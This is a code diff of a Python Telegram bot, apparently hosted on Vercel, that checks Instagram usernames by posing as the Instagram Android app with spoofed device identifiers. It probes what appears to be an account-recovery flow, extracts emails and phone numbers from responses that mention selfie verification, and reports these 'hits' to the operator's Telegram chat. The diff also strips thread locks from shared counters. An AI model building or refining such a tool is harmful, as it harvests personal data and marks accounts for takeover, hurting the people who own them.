@@ -9,22 +9,27 @@ import threading
 import requests
 from http.server import BaseHTTPRequestHandler
 
-# ====================== ENVIRONMENT VARIABLES ======================
+# ====================== ENV ======================
 TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
 if not TOKEN or not CHAT_ID:
-    raise Exception("Set BOT_TOKEN and CHAT_ID in Vercel Environment Variables!")
+    raise Exception("BOT_TOKEN and CHAT_ID must be set in Vercel!")
 
 # ====================== GLOBALS ======================
-hads = bad = erore = 0
+hads = 0
+bad = 0
+erore = 0
 checked = set()
 lock = threading.Lock()
 
-# ====================== ORIGINAL CHECK FUNCTION ======================
+# ====================== CHECK FUNCTION ======================
 def check_one(user):
-    global hads, bad, erore
+    global hads, bad, erore   # ← All globals at the TOP
+
     user = user.strip().lstrip('@').lower()
+    if not user:
+        return
 
     with lock:
         if user in checked:
@@ -36,8 +41,6 @@ def check_one(user):
         random_hex = ''.join(random.choices('0123456789abcdef', k=16))
         ig_device_id = f"android-{random_hex}"
         device_id = str(uuid.uuid4())
-        family_device_id = str(uuid.uuid4())
-        machine_id = f"acgidwABAAG{''.join(random.choices('0123456789abcdef', k=16))}"
 
         headers = {
             'User-Agent': 'Instagram 390.0.0.43.81 Android (33/13; 480dpi; 1080x2316; HONOR; RMO-NX1; HNRMO-Q; qcom; ar_IQ; 766920165)',
@@ -45,8 +48,6 @@ def check_one(user):
             'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
             'x-ig-app-id': '567067343352427',
             'x-ig-device-id': device_id,
-            'x-ig-family-device-id': family_device_id,
-            'x-ig-android-id': ig_device_id,
         }
 
         aac_object = {
@@ -78,31 +79,21 @@ def check_one(user):
                 ).text
 
                 if 'SELFIE' in res2.upper():
-                    with lock:
-                        global hads
-                        hads += 1
+                    hads += 1
                     emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', res2)
                     phone = re.search(r'(\+\d{1,4}[\s\d\-\(\)]{8,})', res2)
-                    msg = f"🎯 **SELFIE HIT**\n\n👤 @{user}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
+                    msg = f"🎯 SELFIE HIT!\n\n👤 @{user}\n📧 {', '.join(set(emails)) or 'None'}\n📞 {phone.group(0) if phone else 'None'}"
                     requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
                                 json={"chat_id": CHAT_ID, "text": msg})
                 else:
-                    with lock:
-                        global bad
-                        bad += 1
-            else:
-                with lock:
-                    global bad
                     bad += 1
+            else:
+                bad += 1
         else:
-            with lock:
-                global erore
-                erore += 1
+            erore += 1
 
     except:
-        with lock:
-            global erore
-            erore += 1
+        erore += 1
 
 
 class handler(BaseHTTPRequestHandler):
@@ -136,7 +127,7 @@ class handler(BaseHTTPRequestHandler):
                      json={"chat_id": chat_id, "text": text})
 
 
-# Auto set webhook (once)
+# Set webhook
 if os.getenv("WEBHOOK_URL"):
     try:
         requests.get(f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={os.getenv('WEBHOOK_URL')}")
